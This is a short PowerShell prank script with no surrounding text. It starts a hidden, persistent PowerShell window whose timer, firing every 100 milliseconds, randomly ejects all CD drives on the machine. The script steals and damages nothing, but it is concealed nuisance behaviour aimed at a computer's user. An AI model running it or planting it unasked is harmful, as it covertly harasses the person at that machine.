powershell.exe -noexit -windowstyle hidden {
$sh = New-Object -ComObject "Shell.Application"
$timer=new-object system.timers.timer
$timer.interval = 100
$timer.autoreset=$true
register-objectevent -inputobject $timer -eventname elapsed -action {
$number = (get-random -minimum "1" -maximum "10")
if ($number -gt "5"){$sh.Namespace(17).Items() |  Where-Object { $_.Type -eq "CD Drive" } | foreach { $_.InvokeVerb("Eject") }}

}

$timer.enabled=$true
}
